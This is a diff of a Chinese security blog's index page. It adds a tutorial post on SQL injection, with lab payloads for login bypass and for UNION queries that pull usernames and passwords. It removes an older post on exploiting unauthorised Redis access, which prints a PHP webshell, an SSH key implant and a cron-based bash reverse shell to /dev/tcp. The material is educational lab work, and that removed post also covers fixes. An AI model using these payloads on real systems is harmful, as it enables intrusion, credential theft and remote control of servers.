@@ -124,7 +124,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -162,6 +162,243 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/13/2021-04-13/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/13/2021-04-13/" class="post-title-link" itemprop="url">一篇文章带你读懂sql注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-13 20:00:01" itemprop="dateCreated datePublished" datetime="2021-04-13T20:00:01+08:00">2021-04-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-15 09:12:25" itemprop="dateModified" datetime="2021-04-15T09:12:25+08:00">2021-04-15</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在本篇随笔当中将会介绍什么是SQL注入，如何查找和利用SQL注入及如何防止SQL注入</p>
+<p><img src="/2021/04/13/2021-04-13/1.jpg"></p>
+<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h4><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
+<p>SQL injection is a web security vulnerability that allows an attacker to  interfere with queries that an application  makes to its databases.It generally allows an attacker to view  data that not normally able to retrive.</p>
+<h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a><strong>危害</strong>：</h4><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
+<h4 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a>基本流程：</h4><ol>
+<li>判断是否有注入点</li>
+<li>获取数据库基本信息</li>
+<li>获取数据库库名</li>
+<li>获取数据库表名</li>
+<li>获取数据库列名</li>
+<li>获取用户信息</li>
+<li>破解数据</li>
+<li>提升权限</li>
+<li>内网渗透</li>
+</ol>
+<p>数据库分关系型数据库和非关系型数据库。</p>
+<p><strong>关系型数据库</strong>：</p>
+<p>主要代表：Mysql、SQL Server、Oracle、PostgreSQL。</p>
+<p><strong>1.概念</strong></p>
+<p>关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
+<p><strong>2.优点</strong></p>
+<p>（1）容易理解，二维表的结构非常贴近现实世界，二维表格，容易理解。</p>
+<p>（2）使用方便，通用的sql语句使得操作关系型数据库非常方便。</p>
+<p>（3）易于维护，数据库的ACID属性，大大降低了数据冗余和数据不一致的概率。</p>
+<p><strong>3.瓶颈</strong></p>
+<p>(1 )海量数据的硬盘I/O读写效率。</p>
+<p>(2) 高扩展性和可用性。难以横向拓展的，数据库没有办法像web Server那样简单的通过添加更多的硬件和服务节点来拓展性能和负载能力。</p>
+<p><strong>非关系型数据库</strong></p>
+<p><strong>1.概念</strong></p>
+<p>主要代表MongoDB，Redis、CouchDB。</p>
+<p>NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
+<p><strong>2.分类</strong></p>
+<p>非关系数据库大部分是开源的，实现比较简单，大都是针对一些特性的应用需求出现的。根据结构化方法和应用场景的不同，分为以下几类。</p>
+<p>（1）面向高性能并发读写的key-value数据库</p>
+<p>主要特点是具有极高的并发读写性能，例如Redis、Tokyo Cabint等。</p>
+<p>（2）面向海量数据访问的面向文档数据库</p>
+<p>特点是，可以在海量的数据库快速的查询数据。例如MongoDB以及CouchDB.</p>
+<p>（3）面向可拓展的分布式数据库</p>
+<p>解决的主要问题是传统数据库的扩展性上的缺陷。</p>
+<p><strong>3.缺点</strong></p>
+<p>不能像sql提供where字段的查询。适合存储较为简单的数据。有一些不能持久化数据，需要和关系型数据库结合。</p>
+<p>本文主要面对mysql，众所周知,mysql针对不同的存储需求，会去选择最优的存储引擎。存储引擎就是存储数据、建立索引、更新查询数据等的实现方式。好像扯多了。来看看与sqli相关的系统函数</p>
+<h2 id="1-常见函数："><a href="#1-常见函数：" class="headerlink" title="1. 常见函数："></a>1. 常见函数：</h2><ol>
+<li><p>version() MySQL 版本 select version()</p>
+</li>
+<li><p>user() 数据库用户名</p>
+</li>
+<li><p>database() 数据库名 select databases;</p>
+</li>
+<li><p>@@datadir 返回数据库的存储目录 select @@datadir;</p>
+</li>
+<li><p>@@version_compile_os 操作系统版本 select @@version_compile_os;</p>
+</li>
+<li><p>SQL 注释语句 (“–”与”/<em>…</em>/“)</p>
+<p>(1)–表示单行注释</p>
+<p>(2)/*…*/用于多行(块)注释</p>
+</li>
+<li><p>concat(str1,str2,…) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL</p>
+</li>
+<li><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串</p>
+</li>
+<li><p>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每条数据</p>
+</li>
+<li><p>mid();  substr(); substring()-从一个字符串中截取指定数量的字符</p>
+</li>
+<li><p>limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据) select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条</p>
+</li>
+<li><p>order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)</p>
+</li>
+<li><p>group by 结合合计函数，根据一个或多个列对结果集进行分组</p>
+</li>
+<li><p>sleep() select sleep(N)可以让此语句运行N秒钟</p>
+</li>
+<li><p>if() 语法：IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。</p>
+</li>
+<li><p>left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL</p>
+</li>
+<li><p>count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)</p>
+</li>
+<li><p>round()  四舍五入一个正数或者负数，结果为一定长度的值</p>
+</li>
+<li><p>hex() 16进制编码 select hex(‘dvwa’)  //编码         select unhex(‘64767761’)  //解码         </p>
+<p>select 0x64767761  //16进制解码</p>
+</li>
+<li><p>ascii(arg)/ord（arg） ：返回目标字符对应的ASCII码，注意：arg为单个字符。     语句：select ascii(‘a’)  </p>
+</li>
+<li><p>char(arg)：返回ASCII码只对应的字符     语句：select char（97）</p>
+</li>
+<li><p>hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)</p>
+</li>
+<li><p>unhex()：将16进制格式的数据装换成原字符串</p>
+<pre><code>语句：unhex(64767761) 
+</code></pre>
+</li>
+<li><p>load_file()读取文件</p>
+</li>
+<li><p>floor()返回小于或等于X的最大整数</p>
+</li>
+<li><p>strcmp() 比较两个字符串ascii值的大小（大小写不敏感）</p>
+</li>
+<li><p>exp()返回e的X次方</p>
+</li>
+</ol>
+<h2 id="2-常用语句："><a href="#2-常用语句：" class="headerlink" title="2. 常用语句："></a>2. 常用语句：</h2><ul>
+<li>查库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from imformation_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_table from information_schema.tables where schema_name&#x3D;&#39;security&#39;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查字段</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select colunm_name from information_schema.colunms where table_name&#x3D;users and table_schema&#x3D;&#39;security&#39;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from security.users;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-注入分类："><a href="#3-注入分类：" class="headerlink" title="3. 注入分类："></a>3. 注入分类：</h2><p>联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、偏移注入等。</p>
+<h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1.Retrieving hidden data"></a>1.Retrieving hidden data</h3><p><a target="_blank" rel="noopener" href="https://ac991fcc1e603304800c031d001b00e5.web-security-academy.net/filter?category=Gifts">where子句的SQLi允许查询隐藏数据</a></p>
+<ul>
+<li>测试是否存在注入：’   ‘’，内部服务器错误，存在sql注入。</li>
+</ul>
+<p><img src="/2021/04/13/2021-04-13/2.jpg"></p>
+<ul>
+<li>数据库正常查询语句：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;pets&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>加单/双引号测试注入:内部服务器报错</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>加双连接符注释掉后面内容：无category为空的内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;--&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>加入真命题，返回全部内容，包含发布与未发布的。release=1代表已发布的。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39; or 1&#x3D;1 --&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2.Subverting application logic"></a>2.Subverting application logic</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">登陆绕过</a></p>
+<p><img src="/2021/04/13/2021-04-13/5.jpg"></p>
+<p>与上面相同，这里不再过多赘述</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常查询语句：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">测试：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;&#39;&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">注释后成功注入：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39;-- AND password &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables"><a href="#3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables" class="headerlink" title="3.UNION attacks, where you can retrieve data from different database tables."></a>3.UNION attacks, where you can retrieve data from different database tables.</h3><p>从数据库表中检索数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常查询：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;GIFTS&#39;</span><br><span class="line">查询其他数据：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;&#39;UNION SELECT username, password FROM users--</span><br></pre></td></tr></table></figure>
+
+<p>union对原始查询结果追加多个额外的<code>SELECT</code>查询。必须满足：</p>
+<ul>
+<li>各个查询列数量相同。</li>
+<li>每个列中的数据类型相同。</li>
+</ul>
+<p>要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</p>
+<p>首先需要确定列数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#39; ORDER BY 1--</span><br><span class="line">&#39; ORDER BY 2--</span><br><span class="line">&#39; ORDER BY 3--</span><br><span class="line">etc.</span><br><span class="line">&#x2F;&#x2F;NULL可以转换为每种常用的数据类型</span><br><span class="line">&#39; UNION SELECT NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-Examining-the-database-where-you-can-extract-information-about-the-version-and-structure-of-the-database"><a href="#4-Examining-the-database-where-you-can-extract-information-about-the-version-and-structure-of-the-database" class="headerlink" title="4.Examining the database, where you can extract information about the version and structure of the database."></a>4.Examining the database, where you can extract information about the version and structure of the database.</h3><h3 id="5-Blind-SQL-injection"><a href="#5-Blind-SQL-injection" class="headerlink" title="5.Blind SQL injection"></a>5.Blind SQL injection</h3><h1 id="0x03-SQLMAP源码分析"><a href="#0x03-SQLMAP源码分析" class="headerlink" title="0x03 SQLMAP源码分析"></a>0x03 SQLMAP源码分析</h1>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -304,142 +541,6 @@
 <li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
 <li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/30/redis/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/30/redis/" class="post-title-link" itemprop="url">redis未授权访问总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-30 15:08:08 / 修改时间：20:47:19" itemprop="dateCreated datePublished" datetime="2021-03-30T15:08:08+08:00">2021-03-30</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>影响版本：3.2.9<br><img src="/2021/03/30/redis/2.jpg"></p>
-<h2 id="0x02-getshell的三种方式"><a href="#0x02-getshell的三种方式" class="headerlink" title="0x02 getshell的三种方式"></a>0x02 getshell的三种方式</h2><ol>
-<li>向web目录写入webshell</li>
-<li>写入SSH公钥，获取系统权限</li>
-<li>写crontab,写入定时任务</li>
-</ol>
-<h3 id="一、向web目录写入webshell"><a href="#一、向web目录写入webshell" class="headerlink" title="一、向web目录写入webshell"></a>一、向web目录写入webshell</h3><ol>
-<li><p>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131</p>
-</li>
-<li><p>测试步骤<br>redis连接除了可指定IP，还可指定域名(替换即可)。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130</span><br><span class="line">设置写入目录</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">设置写入文件</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">写入一句话木马</span><br><span class="line">set XXX &quot;\n\n\n&lt;?php @eval($_POST[&#39;cc&#39;]); ?&gt;\n\n\n&quot;</span><br><span class="line">保存写入硬盘 </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>得到webshell,用蚁剑连接即可</p>
-</li>
-<li><p>总结：</p>
-</li>
-</ol>
-<ul>
-<li>服务器必须有web服务</li>
-<li>无须是root用户起的redis</li>
-<li>无论是windows或linux都可用，但需知道网站的物理路径。Linux默认/var/www/html;Windows可能是D:/phpstudy_pro/www(config get dir判断是否是windows系统)。</li>
-<li>无须flushall清空数据库<br>所以实际渗透过程中，此方法需要搭配phpinfo。先目录爆破获取各种探针文件，再从探针文件中获取相关路径信息、公网 IP 等，甚至从报错中尝试出物理路径信息（有些站的页面报错会直接暴露绝对路径）<h3 id="二、写入SSH公钥，获取系统权限"><a href="#二、写入SSH公钥，获取系统权限" class="headerlink" title="二、写入SSH公钥，获取系统权限"></a>二、写入SSH公钥，获取系统权限</h3>原理：redis未授权访问写authorized_keys强行拿到权限</li>
-</ul>
-<ol>
-<li>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131</li>
-<li>测试步骤<br>本地生成公私钥文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-将加换行的公钥写入test.txt，防止对数据库的其他内容造成影响。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt</span><br></pre></td></tr></table></figure>
-清空数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130 flushall</span><br></pre></td></tr></table></figure>
-把公钥写入test这个key<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-x:代表从标准输入读取数据作为该命令的最后一个参数.set test test.txt</span><br><span class="line">cat test.txt | redis-cli -h 192.168.127.130 -x set test</span><br></pre></td></tr></table></figure>
-连接靶机redis<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130</span><br><span class="line">设置 rdb 文件存放的路径</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line"></span><br><span class="line">config get dir</span><br><span class="line">&quot;dir&quot;</span><br><span class="line">&quot;&#x2F;root&#x2F;.ssh&quot;</span><br><span class="line">设置 rdb 文件的文件名</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">保存到硬盘</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-将自己的公钥写入 /root/.ssh 文件夹中的 authotrized_keys ；<br>然后攻击者可直接执行ssh 192.168.127.130，输入生成公钥时填的key登录靶机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.127.130</span><br></pre></td></tr></table></figure></li>
-<li>总结：<br>漏洞利用前提：</li>
-</ol>
-<ul>
-<li>redis运行在root用户下，否则还要猜测用户，即开启6379端口</li>
-<li>此服务器对外开启了ssh服务。即开启22端口</li>
-<li>不适用于windows<br>当我们获得了redis控制台，可以调用config set来更改dir和dbfilename，且不用重启redis服务就可以写入任意文件。</li>
-</ul>
-<h3 id="三、写入定时任务来执行命令-用于反弹shell"><a href="#三、写入定时任务来执行命令-用于反弹shell" class="headerlink" title="三、写入定时任务来执行命令   用于反弹shell"></a>三、写入定时任务来执行命令   用于反弹shell</h3><ol>
-<li>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131<br>测试条件</li>
-</ol>
-<ul>
-<li>靶机开启redis远程无密码访问</li>
-<li>靶机redis对/var/spool/cron有写入权限<br>环境准备<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关掉守护进程</span><br><span class="line">daemonize no</span><br><span class="line">关掉保护模式</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure></li>
-</ul>
-<ol start="2">
-<li>测试步骤</li>
-</ol>
-<p>利用redis以root权限运行时，写cron</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置写 crontabs 的文件夹路径</span><br><span class="line">config set dir &quot;&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&quot;</span><br><span class="line">修改备份文件名为root</span><br><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure>
-<p>生成文件root文件，之后redis所有数据都会保存在/var/spool/cron/crontabs/root文件中。而这个文件就是root用户的定时任务配置文件。系统会执行该文件定义的定时任务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 写入「反弹 shell」的计划任务</span><br><span class="line">echo -e &quot;\n\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.127.130&#x2F;9999 0&gt;&amp;1\n\n\n&quot;|redis-cli -x set %</span><br><span class="line">保存数据</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>监听指定端口，接收反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
-<p>查看定时任务是否生效：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f vim &#x2F;var&#x2F;log&#x2F;cron</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root目录下生成了hello.outtest文件，且文件内容定时更新</span><br><span class="line">ll &#x2F;root&#x2F;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>总结</li>
-</ol>
-<ul>
-<li>无须flushall清空数据，redis-cli set 1 ‘ringzero’ 这样的语法可以控制第一条记录，就能保证你的内容始终保持在最前面。</li>
-<li>需要root起的redis</li>
-<li>不适用于windows,windows下无计划任务</li>
-</ul>
-<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>用root登陆redis后，可以更改redis的持久化目录。<br>可以修改系统中任意文件，并写入内容</p>
-<h2 id="0x04-修复漏洞"><a href="#0x04-修复漏洞" class="headerlink" title="0x04 修复漏洞"></a>0x04 修复漏洞</h2><p>关闭安全组redis端口，或给予最小访问规则<br>修改redis配置文件：</p>
-<ol>
-<li>网络层指定redis使用的网卡</li>
-<li>设置防火墙策略</li>
-<li>设置访问密码</li>
-</ol>
-<p>日常维护:</p>
-<ol>
-<li>查看定时任务的/etc/crontab 和var/var/spool/cron等文件是否有异常的内容写入</li>
-<li>查看用户登录秘钥是否有异常写入。（对方可以免密登录你的系统）</li>
-<li>查看系统登录日志，查看是否有异常登录</li>
-<li>其他你发现有可能影响的文件<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a><br><a target="_blank" rel="noopener" href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/kouryoushine/article/details/87917762">https://blog.csdn.net/kouryoushine/article/details/87917762</a><br><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4669956">https://my.oschina.net/u/4587690/blog/4669956</a><br><a target="_blank" rel="noopener" href="https://sec.thief.one/article_content?a_id=26075edf17193404345b388f26ffbc26">https://sec.thief.one/article_content?a_id=26075edf17193404345b388f26ffbc26</a></li>
-</ol>
 
       
     </div>
@@ -1148,7 +1249,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
